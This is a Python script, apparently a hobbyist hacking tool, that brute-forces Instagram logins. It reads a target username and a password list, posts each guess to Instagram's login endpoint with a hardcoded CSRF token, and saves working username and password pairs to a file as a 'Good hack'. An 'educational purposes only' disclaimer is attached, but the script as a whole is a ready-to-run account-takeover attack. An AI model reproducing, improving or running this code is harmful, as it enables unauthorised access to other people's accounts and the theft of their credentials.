import sys
import os
import threading
import requests
import time
import random  # Import random module
from time import sleep
from datetime import datetime

class YourClassName:
    def __init__(self):
        pass

    def random_color(self):
        color_codes = [
            "\033[1;31m",  # Red
            "\033[1;32m",  # Green
            "\033[1;33m",  # Yellow
            "\033[1;34m",  # Blue
            "\033[1;35m",  # Purple
            "\033[1;36m",  # Cyan
        ]
        return random.choice(color_codes)

    def graphics(self):
        banner = """
.------..------..------..------..------..------..------..------..------..------.
|C.--. ||Y.--. ||B.--. ||E.--. ||H.--. ||A.--. ||C.--. ||K.--. ||E.--. ||R.--. |
| :/\: || (\/) || :(): || (\/) || :/\: || (\/) || :/\: || :/\: || (\/) || :(): |
| :\/: || :\/: || ()() || :\/: || (__) || :\/: || :\/: || :\/: || :\/: || ()() |
| '--'C|| '--'Y|| '--'B|| '--'E|| '--'H|| '--'A|| '--'C|| '--'K|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'
        """

        colored_banner = self.random_color() + banner + "\033[0m"
        print(colored_banner)

# Clear the screen
clear_screen = lambda: os.system('cls' if os.name == 'nt' else 'clear')

# Header Disclaimer
disclaimer = """
===========================================================
This tool is for educational purposes only.
Do not use it for malicious purposes.
The developer is not responsible for any misuse.
===========================================================
"""

# Print header disclaimer
clear_screen()
print(disclaimer)
input("Press Enter to continue...")
clear_screen()

# Instantiate and use the class
your_class_instance = YourClassName()
your_class_instance.graphics()

# Color Codes
COLORS = {
    "normal": "\33[00m",
    "info": "\033[1;33m",
    "red": "\033[1;31m",
    "green": "\033[1;32m",
    "whiteB": "\033[1;37m",
    "detect": "\033[1;34m",
    "banner": "\033[1;33;40m",
    "end_banner": "\33[00m"
}

# Function to clear the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Print banner
print('''
==============================================
[Developer] => Nitya Parkash Sharma 
[IG] => @Nityasharmax_
==============================================
''')

print('')

user = input(COLORS["end_banner"] + "Usernames => ")
password_file = input("List Of Passwords => ")

# Load passwords from file
passwords = open(password_file).read().splitlines()

login_url = 'https://www.instagram.com/accounts/login/ajax/'

headers = {
    "User-Agent": "Your User Agent Here",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "https://www.instagram.com/accounts/login/",
    "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
}

for password in passwords:
    time_stamp = int(datetime.now().timestamp())

    payload = {
        'username': user,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_stamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    with requests.Session() as s:
        r = s.post(login_url, data=payload, headers=headers)

        if 'checkpoint_url' in r.text or 'userId' in r.text:
            clear_screen()
            print(COLORS["info"] + disclaimer + COLORS["end_banner"])
            print("\n" + COLORS["green"] + f"{user} : {password} --> Good hack" + COLORS["end_banner"])
            with open('good.txt', 'a') as x:
                x.write(f"{user}:{password}\n")
                exit()
        elif 'error' in r.text:
            clear_screen()
            print(COLORS["info"] + disclaimer + COLORS["end_banner"])
            print("\n" + COLORS["red"] + f"{user} : {password} --> عذرا ، كانت هناك مشكلة في طلبك" + COLORS["end_banner"])
        elif 'status' in r.text:
            clear_screen()
            print(COLORS["info"] + disclaimer + COLORS["end_banner"])
            print("\n" + COLORS["end_banner"] + "---------------------------------------")
            print(f"{COLORS['red']} --> {user} : {password}")
            print(f"{COLORS['red']} --> Error")
            sleep(4)
            sys.stdout.write('\rplease wait ..')
            clear_screen()
            print(r.text)
